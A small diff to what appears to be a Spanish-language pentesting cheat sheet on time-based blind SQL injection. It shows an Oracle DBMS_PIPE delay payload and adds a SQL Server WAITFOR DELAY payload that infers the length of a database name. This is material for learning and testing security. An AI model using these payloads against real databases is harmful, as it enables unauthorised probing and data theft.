@@ -12,3 +12,6 @@ Aplicamos lógica de tiempo en SQL para ver si se inyecta y es validada analizan
 | Oracle    | AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)  |
 
 
+### Extraer el length del nombre de una db
+
+    <dato>'; IF (LEN(db_name()))=<num> WAITFOR DELAY '0:0:10'-- 
